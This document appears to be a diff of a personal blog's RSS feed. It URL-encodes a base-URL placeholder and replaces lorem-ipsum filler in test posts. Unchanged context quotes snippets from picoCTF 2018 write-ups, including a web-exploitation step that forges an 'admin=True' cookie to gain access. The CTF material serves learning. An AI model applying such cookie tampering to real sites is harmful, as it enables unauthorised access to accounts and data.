-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-general-skills/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-general-skills/</guid>
             <description>grep-1 1  grep pico file   net-cat 1  nc 2018shell.picoctf.com 37721 | grep pico   strings 1  strings strings | grep pico   The binary name is strings. The utility used to find the flag inside the binary has the same name string
 pipe 1  nc 2018shell.picoctf.com 44310 | grep pico   grep-2 1  ssh 0xade1@2018shell4.picoctf.com &amp;#39;grep -r pico /problems/grep-2_3_826f886f547acb8a9c3fccb030e8168d/files/&amp;#39;   aca-Shell-a 1 2 3 4 5 6 7 8 9 10 11 12 13 14  ls cd secret ls rm intel* echo &amp;#39;Drop it in!</description>
             <content type="html"><![CDATA[<h2 id="grep-1">grep-1</h2>
@@ -22223,10 +22223,10 @@ p<span style="color:#ff79c6">.</span>wait()
         
         <item>
             <title>picoCTF 2018 - Reversing</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-reversing/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-reversing/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-reversing/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-reversing/</guid>
             <description>Recommended resources:  Assembler tutorial Register Calling conventions common-x86-calling-conventions X86_Disassembly/Calling_Conventions Wikipedia x86_64 calling convention  assembly-0  The program is called with two arguments: asm0(0xc9, 0xb0), so the stack frame looks like the following: calling convention is cdecl  | adress of argument2	|	ebp+12 | adress of argument1	|	ebp+8 | return address	|	ebp+4 | old ebp	| &amp;lt;--- ebp nasm code source:
 1 2 3 4 5 6 7 8 9 10 11 12 13 14  .</description>
             <content type="html"><![CDATA[<h2 id="recommended-resources">Recommended resources:</h2>
@@ -24096,10 +24096,10 @@ cipher <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</spa
         
         <item>
             <title>picoCTF 2018 - Web Exploitation</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-web-exploitation/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-web-exploitation/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-web-exploitation/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-web-exploitation/</guid>
             <description>first challenges  logon explore website logon with any username and password, we are logged on and edit cookies admin=True with developper tools refresh the page and get the flag inspect-me  1 2 3 4 5 6  explore html css javascript files or use recursive wget to download website wget --recursive http://2018shell.picoctf.com:47428 grep -r flag 2018shell.picoctf.com\:47428/ 2018shell.picoctf.com:47428/mycss.css:/* I learned CSS! Here&amp;#39;s part 2/3 of the flag: ct0r_g4dget_e96dd105} */ 2018shell.</description>
             <content type="html"><![CDATA[<h2 id="first-challenges">first challenges</h2>
 <ol>
@@ -24353,12 +24353,11 @@ some more fun
         
         <item>
             <title>test 2</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/01/test-2/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/01/test-2/</link>
             <pubDate>Fri, 29 Jan 2021 20:15:44 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/01/test-2/</guid>
-            <description>Intro Aliquam sit amet felis euismod, varius odio ac, commodo ex. Maecenas quis felis ligula. Sed semper nisi et libero accumsan, id condimentum nisl tempus. Donec in elementum tortor, quis facilisis nunc. Duis sed malesuada metus. Vivamus sed dignissim felis, vitae fringilla metus. Pellentesque semper elit leo.
-Title 1 Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam.</description>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/01/test-2/</guid>
+            <description>Intro Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque.</description>
             <content type="html"><![CDATA[<h1 id="intro">Intro</h1>
 
 
@@ -24366,7 +24365,7 @@ Title 1 Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean 
 
 
 
-  <p><em>Aliquam sit amet felis euismod, varius odio ac, commodo ex. Maecenas quis felis ligula. Sed semper nisi et libero accumsan, id condimentum nisl tempus. Donec in elementum tortor, quis facilisis nunc. Duis sed malesuada metus. Vivamus sed dignissim felis, vitae fringilla metus. Pellentesque semper elit leo.</em></p>
+  <p><em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.</em></p>
 
 
 
@@ -24377,11 +24376,11 @@ Title 1 Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean 
 
 
 
-  <p><em>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor. Sed id tortor et neque viverra faucibus. Phasellus sem felis, tincidunt gravida vestibulum eu, lobortis eget nulla. Cras pharetra neque vitae ullamcorper eleifend. Etiam sagittis rhoncus dapibus. Donec ultrices odio at lectus egestas mollis. Cras lacus est, ultrices eget gravida eu, porttitor vel risus. Fusce eu erat in risus congue elementum quis non ante. Ut in interdum felis.</em></p>
+  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
 
-  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>
+  <p><em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.</em></p>
 
-  <p><em>Suspendisse dignissim dignissim enim non imperdiet. Cras tristique, enim non rutrum tempor, purus leo imperdiet lorem, imperdiet sollicitudin diam nunc a purus. Aliquam posuere risus vitae quam luctus aliquet. Nullam pretium nunc velit, at aliquam tellus finibus in. Pellentesque consectetur elit sed sapien iaculis fermentum. Vestibulum at dolor eu nunc gravida dignissim non eget nibh. Donec neque lorem, fringilla ut enim quis, faucibus tincidunt nunc.</em></p>
+  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
 
 
 
@@ -24392,11 +24391,11 @@ Title 1 Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean 
 
 
 
-  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
+  <p><em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.</em></p>
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
 
-  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>
+  <p><em>Aliquam sit amet felis euismod, varius odio ac, commodo ex. Maecenas quis felis ligula. Sed semper nisi et libero accumsan, id condimentum nisl tempus. Donec in elementum tortor, quis facilisis nunc. Duis sed malesuada metus. Vivamus sed dignissim felis, vitae fringilla metus. Pellentesque semper elit leo.</em></p>
 
 
 
@@ -24407,7 +24406,7 @@ Title 1 Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean 
 
 
 
-  <p><em>Suspendisse dignissim dignissim enim non imperdiet. Cras tristique, enim non rutrum tempor, purus leo imperdiet lorem, imperdiet sollicitudin diam nunc a purus. Aliquam posuere risus vitae quam luctus aliquet. Nullam pretium nunc velit, at aliquam tellus finibus in. Pellentesque consectetur elit sed sapien iaculis fermentum. Vestibulum at dolor eu nunc gravida dignissim non eget nibh. Donec neque lorem, fringilla ut enim quis, faucibus tincidunt nunc.</em></p>
+  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>
 
 
 
@@ -24416,23 +24415,22 @@ Title 1 Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean 
         
         <item>
             <title>My First Post</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/01/my-first-post/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/01/my-first-post/</link>
             <pubDate>Mon, 25 Jan 2021 00:04:16 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/01/my-first-post/</guid>
-            <description>//: &amp;lt;&amp;gt; Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.
-Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl.</description>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/01/my-first-post/</guid>
+            <description>//: &amp;lt;&amp;gt; Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue.</description>
             <content type="html"><![CDATA[<p><a href="" title="ceci est un commentaire">//</a>: &lt;&gt; 
 
 
 
 
 
+  <p><em>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue. Maecenas ut molestie eros. Quisque eleifend pharetra dui, sed lacinia mauris iaculis a. Donec vel venenatis nulla, non dignissim dui. Curabitur in nisi nec felis dictum ultrices sit amet quis augue.</em></p>
+
+  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
+
   <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
-
-  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>
-
-  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
 
 
 </p>
